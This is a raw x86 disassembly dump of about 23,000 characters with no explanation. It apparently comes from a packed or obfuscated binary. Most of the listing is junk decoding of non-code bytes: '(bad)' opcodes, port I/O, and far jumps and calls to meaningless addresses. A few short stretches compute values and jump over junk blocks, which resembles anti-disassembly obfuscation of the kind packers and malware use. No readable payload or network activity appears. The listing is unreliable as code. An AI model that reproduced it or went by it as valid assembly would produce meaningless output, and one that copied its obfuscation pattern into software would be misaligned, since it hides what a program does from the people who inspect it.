  408fb1:	add    BYTE PTR [eax],ah
  408fb3:	fwait
  408fb4:	outs   dx,BYTE PTR ds:[esi]
  408fb5:	cld    
  408fb6:	popf   
  408fb7:	adc    DWORD PTR [esi-0x5e],0x77
  408fbb:	faddp  st(0),st
  408fbd:	lahf   
  408fbe:	fiadd  WORD PTR [ebx+0x64bc6da0]
  408fc4:	inc    esp
  408fc5:	outs   dx,DWORD PTR ds:[esi]
  408fc6:	jmp    0x6d2c:0x1f57c03b
  408fcd:	(bad)  
  408fce:	sbb    eax,0x71006a2
  408fd3:	jnp    0x408fe3
  408fd5:	jno    0x408f9d
  408fd7:	mov    eax,0xdbbeb0c0
  408fdc:	xchg   edx,eax
  408fdd:	pop    es
  408fde:	dec    ebp
  408fdf:	pop    edi
  408fe0:	out    0x70,eax
  408fe2:	dec    esi
  408fe3:	(bad)  
  408fe4:	out    dx,al
  408fe5:	sbb    al,0x2d
  408fe7:	aam    0xe8
  408fe9:	loopne 0x408ffe
  408feb:	sbb    edi,DWORD PTR [eax-0xc]
  408fee:	pusha  
  408fef:	ror    BYTE PTR [ebp-0x23],cl
  408ff2:	(bad)  
  408ff3:	mov    dh,0x2c
  408ff5:	xchg   esi,eax
  408ff6:	loop   0x408fd9
  408ff8:	xor    DWORD PTR [ebx-0x4],ebp
  408ffb:	push   es
  408ffc:	or     edx,eax
  408ffe:	pop    es
  408fff:	mov    bh,0x35
  409001:	rol    dl,1
  409003:	inc    ebp
  409004:	test   BYTE PTR [eax+0x6f],bh
  409007:	int    0x27
  409009:	sub    ebx,edx
  40900b:	cmp    al,0x40
  40900d:	cli    
  40900e:	fadd   QWORD PTR [eax+0x11]
  409011:	in     al,dx
  409012:	fld    QWORD PTR [ecx+esi*2-0x57956b94]
  409019:	mov    ebp,0x30f271a4
  40901e:	loope  0x40907a
  409020:	inc    edx
  409021:	jp     0x408fd7
  409023:	add    BYTE PTR [ebx-0x359232e0],bh
  409029:	xchg   ecx,eax
  40902a:	in     al,0x1f
  40902c:	or     BYTE PTR [esp+edx*8],dl
  40902f:	pop    esp
  409030:	outs   dx,DWORD PTR ds:[esi]
  409031:	cdq    
  409032:	pop    edi
  409033:	mov    ds:0x3e3518cf,eax
  409038:	xor    al,0x31
  40903a:	pop    edx
  40903b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40903c:	add    dh,bh
  40903e:	dec    edi
  40903f:	push   es
  409040:	mov    BYTE PTR [edx+0x65],0xa7
  409044:	xchg   ecx,eax
  409045:	cli    
  409046:	mov    bh,0x2a
  409048:	bound  ecx,QWORD PTR [esi+ecx*4+0x613d4e8e]
  40904f:	les    edi,FWORD PTR [eax+edi*8+0x59bca4bc]
  409056:	xor    ebx,DWORD PTR [esi]
  409058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409059:	das    
  40905a:	adc    edx,DWORD PTR [edx+0x47]
  40905d:	(bad)  
  40905f:	lock inc esp
  409061:	pop    edx
  409062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409063:	mov    bh,0x39
  409065:	fisub  WORD PTR [esi+0x1b0bd6f9]
  40906b:	out    dx,al
  40906c:	rol    DWORD PTR [eax+eax*1],cl
  40906f:	imul   ecx,esi,0xffffffc4
  409072:	mov    BYTE PTR ds:0x387ab7e,0xc6
  409079:	or     eax,0xe1055157
  40907e:	cmp    BYTE PTR [edx+edi*8],0x23
  409082:	dec    esi
  409083:	sbb    cl,BYTE PTR [ebx+0x48326d69]
  409089:	in     eax,0x69
  40908b:	mov    dl,0x54
  40908d:	pop    ds
  40908e:	out    0xb9,eax
  409090:	lahf   
  409091:	sub    eax,0xfb72927a
  409096:	and    cl,bl
  409098:	fisubr WORD PTR gs:[edi]
  40909b:	sbb    DWORD PTR [ebx-0x7a5b5e06],edx
  4090a1:	push   0xbd80d1e9
  4090a6:	call   0xb04f:0x9dd86fae
  4090ad:	lods   al,BYTE PTR ds:[esi]
  4090ae:	xchg   edx,eax
  4090af:	mov    eax,0x2f7d0835
  4090b4:	pop    edi
  4090b5:	loopne 0x4090e8
  4090b7:	mov    edi,0x2cead5e8
  4090bc:	stc    
  4090bd:	int3   
  4090be:	jae    0x409139
  4090c0:	daa    
  4090c1:	dec    ebp
  4090c2:	repz adc ebp,DWORD PTR [ebx]
  4090c5:	cli    
  4090c6:	or     BYTE PTR [ebx],bl
  4090c8:	mov    eax,ds:0xff1912c3
  4090cd:	adc    DWORD PTR [eax],ebx
  4090cf:	mov    dh,0x7a
  4090d1:	cmp    esi,eax
  4090d3:	mov    DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x13a4c6c4
  4090f5:	arpl   WORD PTR ds:0x78ef8ec4,cx
  4090fb:	js     0x4090a4
  4090fd:	jle    0x409177
  4090ff:	js     0x409164
  409101:	imul   esp
  409103:	mov    ah,0xe
  409105:	cs add al,0xdc
  409108:	xor    bh,ah
  40910a:	push   0x9e8d9b18
  40910f:	lods   al,BYTE PTR ds:[esi]
  409110:	dec    edi
  409111:	inc    edx
  409112:	cmp    eax,0xbff9d2e8
  409117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409118:	or     edi,ebx
  40911a:	mov    ebx,0xc4d451a
  40911f:	mov    ds:0x6a471a2,al
  409124:	mov    gs,WORD PTR [edi-0x5c5a4c95]
  40912a:	jecxz  0x40912c
  40912c:	jg     0x409117
  40912e:	out    0x8c,al
  409130:	mov    al,0x28
  409132:	adc    BYTE PTR [esi],bl
  409134:	(bad)  
  409135:	out    0xba,al
  409137:	idiv   DWORD PTR ds:[ebx+0x72bf3bac]
  40913e:	push   ds
  40913f:	(bad)  
  409140:	lds    eax,FWORD PTR [ebp-0x4fd8a665]
  409146:	daa    
  409147:	dec    edx
  409148:	push   0xffffff9d
  40914a:	call   0xb0adc708
  40914f:	sub    dl,BYTE PTR [esi-0x1e]
  409152:	cmp    DWORD PTR [ebx+0x15a5bb63],ebx
  409158:	dec    ebx
  409159:	mov    WORD PTR [esi+ebp*4+0x3c],?
  40915d:	test   BYTE PTR [edx],0xd6
  409160:	int    0xc7
  409162:	ret    
  409163:	mov    bl,0xae
  409165:	push   eax
  409166:	mov    es,WORD PTR [ebx]
  409168:	jmp    0x4794f25
  40916d:	scas   eax,DWORD PTR es:[edi]
  40916e:	pop    ecx
  40916f:	mov    ?,eax
  409171:	dec    ecx
  409172:	pop    esp
  409173:	mov    ecx,0x609228a3
  409178:	inc    esi
  409179:	sahf   
  40917a:	xchg   esi,eax
  40917b:	popf   
  40917c:	mov    dl,0xad
  40917e:	call   0xea702594
  409183:	int    0x64
  409185:	inc    eax
  409186:	bound  ecx,QWORD PTR [esi+ebx*2-0x67]
  40918a:	lea    esi,[esi-0xb50426c]
  409190:	lods   eax,DWORD PTR ds:[esi]
  409191:	retf   
  409192:	test   al,0x64
  409194:	xchg   ebx,eax
  409195:	dec    edi
  409196:	in     al,0xe3
  409198:	ss retf 
  40919a:	add    BYTE PTR [esi+edx*1],0xd2
  40919e:	aam    0xc0
  4091a0:	push   0xaa0aa54e
  4091a5:	lea    esi,[ecx-0x53]
  4091a8:	dec    eax
  4091a9:	stos   BYTE PTR es:[edi],al
  4091aa:	mov    ch,0xd7
  4091ac:	call   0xfedac9b1
  4091b1:	fild   DWORD PTR [ecx]
  4091b3:	push   0xbbc00cbe
  4091b8:	jb     0x409188
  4091ba:	sub    al,0x33
  4091bc:	ret    0x7077
  4091bf:	popa   
  4091c0:	pop    edx
  4091c1:	shl    BYTE PTR [edi+0x7e],0x80
  4091c5:	sbb    DWORD PTR [esi],ebp
  4091c7:	push   es
  4091c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091c9:	gs retf 
  4091cb:	(bad)  
  4091cc:	int    0xff
  4091ce:	adc    cl,ch
  4091d0:	push   0x7d
  4091d2:	in     al,dx
  4091d3:	dec    esp
  4091d4:	retf   0x8272
  4091d7:	retf   0xdc1d
  4091da:	test   al,0x9c
  4091dc:	mov    edx,0x412608e
  4091e1:	iret   
  4091e2:	dec    ebx
  4091e3:	test   eax,0x6aae2415
  4091e8:	sbb    ecx,DWORD PTR [ebp-0x5d3bfcd4]
  4091ee:	jnp    0x409248
  4091f0:	inc    DWORD PTR [ebx]
  4091f2:	inc    edx
  4091f3:	lds    ebp,FWORD PTR [edi+0x73]
  4091f6:	xchg   edi,eax
  4091f7:	pop    ds
  4091f8:	outs   dx,BYTE PTR ds:[esi]
  4091f9:	cwde   
  4091fa:	in     eax,dx
  4091fb:	out    0xbd,eax
  4091fd:	cmp    edi,edx
  4091ff:	xor    BYTE PTR [esi-0x37],ah
  409202:	jl     0x4091fa
  409204:	loope  0x4091cb
  409206:	mov    al,0x4f
  409208:	shr    BYTE PTR [ebx-0x2],0xce
  40920c:	mov    bh,0x8d
  40920e:	cdq    
  40920f:	cmp    eax,0xb743fd11
  409214:	xchg   ecx,eax
  409215:	sub    dh,ah
  409217:	mov    ch,0x57
  409219:	aaa    
  40921a:	push   esp
  40921b:	fisttp DWORD PTR [ebx-0x2a]
  40921e:	cmc    
  40921f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409220:	sahf   
  409221:	rcr    DWORD PTR [edi+0x75],0xf6
  409225:	adc    DWORD PTR [ebx-0x619969da],ebx
  40922b:	lods   al,BYTE PTR ds:[esi]
  40922c:	enter  0x2d9d,0x76
  409230:	jmp    0x94143732
  409235:	pop    ebx
  409236:	ror    ebx,1
  409238:	int    0x8f
  40923a:	int3   
  40923b:	test   eax,0xd9f8d23c
  409240:	mov    eax,ds:0x92da8c71
  409245:	lahf   
  409246:	pop    ecx
  409247:	ret    
  409248:	nop
  409249:	jbe    0x40922e
  40924b:	test   DWORD PTR [eax+0x63],0xe3d05b88
  409252:	sar    BYTE PTR [edx-0x5e8740b5],1
  409258:	xchg   ebp,eax
  409259:	push   esp
  40925a:	test   al,0x84
  40925c:	aam    0xa5
  40925e:	icebp  
  40925f:	out    dx,eax
  409260:	pop    edi
  409261:	cmp    DWORD PTR [esi+ecx*4-0x4a],edi
  409265:	cwde   
  409266:	jno    0x4092e1
  409268:	out    dx,al
  409269:	push   ebp
  40926a:	mov    ds:0x890b5e01,al
  40926f:	jbe    0x4092d2
  409271:	imul   edx
  409273:	ret    
  409274:	sahf   
  409275:	and    ecx,edx
  409277:	bound  esp,QWORD PTR [edx+0x35e296b2]
  40927d:	mov    al,0xd3
  40927f:	stos   BYTE PTR es:[edi],al
  409280:	loopne 0x409247
  409282:	arpl   ax,sp
  409284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409285:	sub    al,0x80
  409287:	in     eax,0x8c
  409289:	loope  0x40922f
  40928b:	lds    edx,FWORD PTR [ebx+eiz*8]
  40928e:	jmp    0x4c7d:0x339eb6d9
  409295:	add    eax,0xa59753b8
  40929a:	sbb    DWORD PTR [edi+edx*2-0xf5daf3e],0x15
  4092a2:	arpl   bp,ax
  4092a4:	cmp    DWORD PTR [esi+0x7dfa0160],0xffffffec
  4092ab:	jg     0x409312
  4092ad:	dec    esi
  4092ae:	sub    bl,BYTE PTR [eax]
  4092b0:	dec    esi
  4092b1:	dec    esi
  4092b2:	inc    esp
  4092b3:	xlat   BYTE PTR ds:[ebx]
  4092b4:	inc    ebp
  4092b5:	shl    edx,1
  4092b7:	push   0xafee89b
  4092bc:	push   0xf99902cd
  4092c1:	stos   DWORD PTR es:[edi],eax
  4092c2:	push   ebx
  4092c3:	push   ebx
  4092c4:	and    esp,DWORD PTR [esi-0x34]
  4092c7:	cmp    DWORD PTR [ecx],0x73b8b2e0
  4092cd:	stos   DWORD PTR es:[edi],eax
  4092ce:	test   eax,0x99642ee1
  4092d3:	ret    
  4092d4:	adc    bh,BYTE PTR [edi+0x2a5c07a2]
  4092da:	jns    0x40931e
  4092dc:	das    
  4092dd:	mov    eax,ds:0x6921c205
  4092e2:	mov    edx,0x1319ae11
  4092e7:	push   cs
  4092e8:	inc    esi
  4092e9:	push   esi
  4092ea:	arpl   ax,bp
  4092ec:	xchg   bh,ch
  4092ee:	mov    ecx,0x9e17dbb
  4092f3:	ins    BYTE PTR es:[edi],dx
  4092f4:	inc    edi
  4092f5:	(bad)  
  4092f6:	(bad)  
  4092f8:	mov    ecx,0x4e299c17
  4092fd:	(bad)  
  4092fe:	mov    ah,0x3c
  409300:	sbb    ecx,DWORD PTR [esi]
  409302:	pop    ds
  409303:	xor    ecx,0xadc2b7c5
  409309:	sub    dl,BYTE PTR [ebp+0x124873a8]
  40930f:	sub    BYTE PTR ds:0xb1515e4f,cl
  409315:	sti    
  409316:	cmp    eax,0xbc6164a0
  40931b:	push   esp
  40931c:	sar    ch,1
  40931e:	mov    edx,0xd4da1da9
  409323:	xor    dl,cl
  409325:	mov    cl,BYTE PTR [esi+0x13b631b8]
  40932b:	aas    
  40932c:	clc    
  40932d:	clc    
  40932e:	fistp  QWORD PTR [ebp+0x70e69b5d]
  409334:	(bad)  
  409335:	mov    WORD PTR [esi],es
  409337:	jg     0x4092c4
  409339:	fld    st(7)
  40933b:	adc    al,BYTE PTR [edx+0x7a]
  40933e:	mov    ebp,0xc6f53d30
  409343:	js     0x40937d
  409345:	lods   al,BYTE PTR ds:[esi]
  409346:	push   edi
  409347:	jmp    0x7319481c
  40934c:	icebp  
  40934d:	(bad)  
  40934e:	(bad)  
  40934f:	push   edx
  409350:	jns    0x4092de
  409352:	gs std 
  409354:	push   0xf0bdfed7
  409359:	je     0x4092de
  40935b:	mov    WORD PTR [edx+ebp*1+0x14a63c48],es
  409362:	pop    esi
  409363:	or     edi,ebp
  409365:	and    BYTE PTR [edi+0x5f],ch
  409368:	nop
  409369:	mov    dl,0x8d
  40936b:	in     eax,0x16
  40936d:	call   esp
  40936f:	enter  0x74a8,0xbe
  409373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409374:	xchg   edx,eax
  409375:	cmp    eax,0xcf462fa4
  40937a:	mov    bl,bh
  40937c:	sti    
  40937d:	xor    ah,cl
  40937f:	loop   0x40936c
  409381:	inc    esp
  409382:	xchg   edi,eax
  409383:	push   esp
  409384:	mov    eax,ds:0x4b23d9d5
  409389:	popa   
  40938a:	push   es
  40938b:	jno    0x409351
  40938d:	or     DWORD PTR [ecx+0x41],ebp
  409390:	cmp    al,bl
  409392:	mov    dh,0x99
  409394:	mov    al,ds:0x1a3c45d8
  409399:	add    edx,ebp
  40939b:	cmp    al,0x28
  40939d:	sbb    eax,0x3fdad048
  4093a2:	es jl  0x409360
  4093a5:	adc    bl,dh
  4093a7:	scas   al,BYTE PTR es:[edi]
  4093a8:	push   ds
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xbeacff3d
  4093fb:	sbb    BYTE PTR [esi+0x35],cl
  4093fe:	in     al,dx
  4093ff:	js     0x409479
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	jle    0x40947c
  409404:	js     0x40944f
  409406:	mov    dh,0x80
  409408:	jp     0x4093f0
  40940a:	dec    ebx
  40940b:	nop
  40940c:	rcl    BYTE PTR [edi-0x32b5e48f],cl
  409412:	mov    ebx,0x3c5b9c89
  409417:	test   eax,0x1640b1b4
  40941c:	fcomi  st,st(3)
  40941e:	cli    
  40941f:	sar    DWORD PTR [edi-0x3a],1
  409422:	inc    edx
  409423:	mov    cl,0x74
  409425:	or     al,0x63
  409427:	push   ds
  409428:	xor    cl,BYTE PTR [edi+0x57]
  40942b:	loop   0x40946d
  40942d:	fldenv [ebp+0x64135b0d]
  409433:	sbb    BYTE PTR [ebx-0x3050ca40],al
  409439:	pop    esi
  40943a:	xor    al,0x4f
  40943c:	xchg   esp,eax
  40943d:	enter  0x93d6,0x3b
  409441:	push   ss
  409442:	dec    ebp
  409443:	daa    
  409444:	es jmp 0x40943f
  409447:	inc    ebp
  409448:	jle    0x4093d3
  40944a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40944b:	or     DWORD PTR [ecx+edi*8-0x6afb63a8],0xffffffe5
  409453:	aam    0xd7
  409455:	xlat   BYTE PTR ds:[ebx]
  409456:	retfw  0x97d2
  40945a:	pop    es
  40945b:	add    dl,cl
  40945d:	mov    ah,0x40
  40945f:	ret    0xe475
  409462:	xor    DWORD PTR cs:[esi],ecx
  409465:	xchg   ebp,eax
  409466:	dec    eax
  409467:	fmulp  st(7),st
  409469:	push   edx
  40946a:	xchg   ebx,eax
  40946b:	and    ebp,esp
  40946d:	mov    ds:0x4556d46f,eax
  409472:	and    esp,DWORD PTR [edx-0x28]
  409475:	jmp    0xe4294987
  40947a:	call   esi
  40947c:	dec    esi
  40947d:	fwait
  40947e:	dec    edi
  40947f:	adc    eax,0xf460262a
  409484:	mov    ah,0xc2
  409486:	fwait
  409487:	leave  
  409488:	ss aam 0x42
  40948b:	mov    ebp,fs
  40948d:	retf   
  40948e:	cmp    DWORD PTR [esi+0x66],esp
  409491:	in     al,0xe2
  409493:	add    eax,0x45a8b2af
  409498:	sti    
  409499:	xlat   BYTE PTR ds:[ebx]
  40949a:	icebp  
  40949b:	loopne 0x4094d4
  40949d:	cmc    
  40949e:	and    eax,0x3058293a
  4094a3:	mov    ebx,ecx
  4094a5:	dec    ebx
  4094a6:	test   DWORD PTR [eax-0x54f6b1ef],edx
  4094ac:	push   esi
  4094ad:	pop    ss
  4094ae:	cmc    
  4094af:	mov    cl,0x71
  4094b1:	sub    dh,BYTE PTR [ebx+0x40]
  4094b4:	and    al,0xa
  4094b6:	retf   0xe29c
  4094b9:	cmp    DWORD PTR [eax],0xffffffb3
  4094bc:	pop    edi
  4094bd:	fwait
  4094be:	lods   eax,DWORD PTR ds:[esi]
  4094bf:	inc    eax
  4094c0:	mov    edx,0xa5b15b09
  4094c5:	iret   
  4094c6:	xor    DWORD PTR [edi-0x7b],edx
  4094c9:	xor    esi,ebp
  4094cb:	jp     0x409492
  4094cd:	rol    DWORD PTR [esi+edi*1+0x679be38a],0xa9
  4094d5:	in     al,0xd4
  4094d7:	xor    ebx,DWORD PTR [ebx-0x60452469]
  4094dd:	aad    0x10
  4094df:	out    dx,eax
  4094e0:	and    al,0xb0
  4094e2:	jl     0x409468
  4094e4:	(bad)  
  4094e5:	js     0x409522
  4094e7:	dec    edx
  4094e8:	test   eax,0x2ec76d51
  4094ed:	pop    esi
  4094ee:	aaa    
  4094ef:	sub    BYTE PTR [ebx-0x2f9b1881],cl
  4094f5:	shl    BYTE PTR [esi-0x57],0x20
  4094f9:	test   dh,0x1f
  4094fc:	mov    al,dh
  4094fe:	fwait
  4094ff:	jp     0x4094a6
  409501:	xor    BYTE PTR [eax+edi*4+0x7e1b20a1],0x17
  409509:	fs std 
  40950b:	stos   DWORD PTR es:[edi],eax
  40950c:	loop   0x40957c
  40950e:	lods   al,BYTE PTR ds:[esi]
  40950f:	inc    ebx
  409510:	mov    WORD PTR [ecx-0x5b9a9721],gs
  409516:	popa   
  409517:	inc    edx
  409518:	dec    edx
  409519:	mov    edx,0x1440eee7
  40951e:	shl    DWORD PTR [edx-0x5d],0x58
  409522:	push   ebx
  409523:	popf   
  409524:	dec    esi
  409525:	mov    edi,0xb743bae9
  40952a:	pop    es
  40952b:	aad    0x61
  40952d:	jb     0x40954b
  40952f:	sahf   
  409530:	aaa    
  409531:	jp     0x409551
  409533:	pop    ecx
  409534:	cmp    eax,ebx
  409536:	or     eax,0x2b6f89b2
  40953b:	fwait
  40953c:	outs   dx,DWORD PTR ds:[esi]
  40953d:	aaa    
  40953e:	xchg   DWORD PTR [esi-0x4ac6a01f],edi
  409544:	and    bl,BYTE PTR ds:0x701ac43d
  40954a:	dec    esp
  40954b:	je     0x4095c2
  40954d:	(bad)  
  40954e:	sub    DWORD PTR [esi],ecx
  409550:	scas   al,BYTE PTR es:[edi]
  409551:	xchg   ch,dl
  409553:	sahf   
  409554:	fwait
  409555:	dec    eax
  409556:	pushf  
  409557:	imul   edx,ecx,0x4c
  40955a:	add    esi,edx
  40955c:	adc    edi,DWORD PTR [ecx+0x69]
  40955f:	sub    al,0x7e
  409561:	pop    ebx
  409562:	xor    eax,0x32c5c3c6
  409567:	mov    gs,WORD PTR [ecx]
  409569:	adc    edx,DWORD PTR [edi-0x4a]
  40956c:	inc    eax
  40956d:	shl    BYTE PTR [edx],0x89
  409570:	fisubr DWORD PTR [edi]
  409572:	inc    ebp
  409573:	push   cs
  409574:	call   0x10128e3f
  409579:	icebp  
  40957a:	adc    eax,0xb47a59e8
  40957f:	cmp    DWORD PTR [ecx-0x38],0x12532088
  409586:	or     ch,BYTE PTR [esi-0x2c9d109f]
  40958c:	mov    al,0x80
  40958e:	(bad)  
  409590:	out    0x54,al
  409592:	xchg   esp,eax
  409593:	enter  0xda8f,0x91
  409597:	pop    ebx
  409598:	and    al,BYTE PTR [ebx+0x1f02729]
  40959e:	pusha  
  40959f:	imul   esp,DWORD PTR [esi+0x75b81d23],0xfc93b629
  4095a9:	mov    bh,0x7f
  4095ab:	push   ds
  4095ac:	inc    eax
  4095ae:	mov    edi,0xe0b1cfdf
  4095b3:	xor    dh,BYTE PTR [ebx-0x76cb4fd1]
  4095b9:	ret    
  4095ba:	pop    edx
  4095bb:	ins    DWORD PTR es:[edi],dx
  4095bc:	nop
  4095bd:	call   0xe426:0x4006d613
  4095c4:	jbe    0x40961e
  4095c6:	in     al,dx
  4095c7:	mov    dl,bl
  4095c9:	lea    ecx,ds:0xbf65c07f
  4095cf:	mov    ebx,0x59bfd48b
  4095d4:	(bad)  
  4095d5:	adc    dh,BYTE PTR [esi+0x252cb5ac]
  4095db:	jmp    0x7b0484f8
  4095e0:	or     DWORD PTR ds:0xa81010d2,edx
  4095e6:	and    BYTE PTR [edx+0x3e],ch
  4095e9:	data16 clc 
  4095eb:	pushf  
  4095ec:	or     ch,BYTE PTR [ebx]
  4095ee:	mov    al,BYTE PTR [ecx-0xa572d50]
  4095f4:	mov    eax,0x70b7482a
  4095f9:	stos   DWORD PTR es:[edi],eax
  4095fa:	inc    edx
  4095fb:	sti    
  4095fc:	pop    ds
  4095fd:	stos   BYTE PTR es:[edi],al
  4095fe:	lods   eax,DWORD PTR ds:[esi]
  4095ff:	mov    ds:0xdb629809,eax
  409604:	jge    0x4095ed
  409606:	push   bx
  409608:	mov    ebx,0x1e3b68ac
  40960d:	push   ss
  40960e:	outs   dx,DWORD PTR ds:[esi]
  40960f:	fcom   DWORD PTR [ecx]
  409611:	sbb    al,0xba
  409613:	sbb    ch,ch
  409615:	jbe    0x4095b3
  409617:	xchg   esp,eax
  409618:	jg     0x409670
  40961a:	dec    ebp
  40961b:	push   es
  40961c:	sub    bl,BYTE PTR [edi+0x23]
  40961f:	inc    eax
  409620:	xchg   esi,eax
  409621:	or     BYTE PTR [eax+0x625cdac2],dl
  409627:	call   0xe2bdaf54
  40962c:	iret   
  40962d:	inc    ecx
  40962e:	add    esi,DWORD PTR [ebx-0x67bc092b]
  409634:	xor    al,0x76
  409636:	pop    ss
  409637:	mov    al,0x35
  409639:	sbb    ch,dl
  40963b:	xchg   esi,eax
  40963c:	mov    al,0x1b
  40963e:	leave  
  40963f:	call   0x97d7129
  409644:	or     BYTE PTR [ebp+0x63],ch
  409647:	inc    ebp
  409648:	or     ebx,ebx
  40964a:	mov    edi,0x855a5f
  40964f:	mov    cl,0x45
  409651:	xchg   ebx,eax
  409652:	fs ss push ebp
  409655:	xchg   BYTE PTR [edi-0x54],cl
  409658:	or     BYTE PTR [ebx],0x9a
  40965b:	test   eax,0x209b6b6c
  409660:	xor    ch,BYTE PTR [ecx+0x4]
  409663:	mov    esi,0xd6eaf6fa
  409668:	push   ss
  409669:	inc    ebp
  40966a:	dec    esi
  40966b:	xchg   esp,eax
  40966c:	jge    0x4096b8
  40966e:	leave  
  40966f:	adc    ah,BYTE PTR [eax-0x55]
  409672:	jl     0x4096f3
  409674:	outs   dx,BYTE PTR ds:[esi]
  409675:	or     DWORD PTR cs:[edi],ebp
  409678:	or     DWORD PTR [ebp-0x64],esp
  40967b:	nop
  40967c:	std    
  40967d:	fdiv   QWORD PTR [ebx+0x1e]
  409680:	push   ebx
  409681:	xchg   edi,eax
  409682:	ds dec esp
  409684:	outs   dx,DWORD PTR ds:[esi]
  409685:	aam    0x78
  409687:	scas   eax,DWORD PTR es:[edi]
  409688:	(bad)  
  409689:	(bad)  
  40968a:	pop    esi
  40968b:	jbe    0x4096c3
  40968d:	retf   
  40968e:	and    al,0x45
  409690:	xchg   DWORD PTR [ecx],esp
  409692:	add    edx,DWORD PTR [ebx+ecx*8+0xc088099]
  409699:	lahf   
  40969a:	dec    esp
  40969b:	shr    ah,0x31
  40969e:	sub    edx,DWORD PTR [ebp+0x29570bde]
  4096a4:	push   ebx
  4096a5:	jnp    0x4096e0
  4096a7:	mov    ss:0x7e40beee,al
  4096ad:	dec    ecx
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x40
  4096e4:	sub    ch,BYTE PTR [ecx+0x78f25ccf]
  4096ea:	js     0x40973e
  4096ec:	jle    0x409766
  4096ee:	js     0x40974c
  4096f0:	mov    esp,0xe1cc7ed2
  4096f5:	push   es
  4096f6:	out    0x3f,al
  4096f8:	(bad)  
  4096f9:	push   ecx
  4096fa:	push   0x26674e1c
  4096ff:	xchg   esp,eax
  409700:	scas   eax,DWORD PTR es:[edi]
  409701:	add    BYTE PTR [eax-0x71e01ac7],bh
  409707:	mov    al,ds:0x4fd869b4
  40970c:	imul   ecx,DWORD PTR [ebx-0x7b4413bc],0xa2a731ce
  409716:	je     0x40970f
  409718:	mov    esi,0xfeba6657
  40971d:	rcr    DWORD PTR [edi+eax*1-0x70],1
  409721:	cmp    eax,0x525d8de4
  409726:	pop    ds
  409727:	sbb    BYTE PTR [ebp+ebp*8+0x3],ch
  40972b:	mov    esp,DWORD PTR [esp+edx*2-0x26]
  40972f:	sub    al,0xc4
  409731:	sbb    bl,BYTE PTR [ebp-0x4e]
  409734:	outs   dx,BYTE PTR ds:[esi]
  409735:	das    
  409736:	retf   0xc320
  409739:	cmc    
  40973a:	pushf  
  40973b:	cs xor dh,ah
  40973e:	pop    ebx
  40973f:	push   ecx
  409740:	pusha  
  409741:	aas    
  409742:	jg     0x4097b0
  409744:	adc    edi,DWORD PTR [ebp+0x5c]
  409747:	stos   BYTE PTR es:[edi],al
  409748:	je     0x40977a
  40974a:	fist   DWORD PTR [esi+0x29]
  40974d:	aas    
  40974e:	pop    ds
  40974f:	dec    edi
  409750:	sub    DWORD PTR [esi],ecx
  409752:	sbb    ecx,eax
  409754:	add    BYTE PTR [eax+0xd],dl
  409757:	jae    0x409786
  409759:	xor    BYTE PTR [eax-0x1a],ch
  40975c:	xchg   esi,eax
  40975d:	add    BYTE PTR [ecx],ah
  40975f:	cmp    BYTE PTR [ebp-0x63a76f96],bl
  409765:	fucomi st,st(5)
  409767:	inc    ecx
  409768:	push   es
  409769:	arpl   WORD PTR [edx+0x39110d7],dx
  40976f:	mov    eax,0x984ce95e
  409774:	(bad)  
  409775:	leave  
  409776:	adc    BYTE PTR [edi+eiz*1],ch
  409779:	cli    
  40977a:	pop    ebx
  40977b:	xor    ch,ch
  40977d:	or     edi,0xfe5ffb87
  409783:	int3   
  409784:	and    bl,BYTE PTR [edx+0x7e]
  409787:	push   ebx
  409788:	mov    dh,0x19
  40978a:	cmp    ebp,0x7e2b77a9
  409790:	cmp    al,0xa1
  409792:	mov    cl,0x12
  409794:	jno    0x409759
  409796:	idiv   DWORD PTR [ebx]
  409798:	mov    ss,WORD PTR ds:0xc2bf5ba4
  40979e:	je     0x40977e
  4097a0:	xor    BYTE PTR [ebp+0x22],cl
  4097a3:	jmp    0xc44a:0xb9f971f1
  4097aa:	enter  0xae8e,0x48
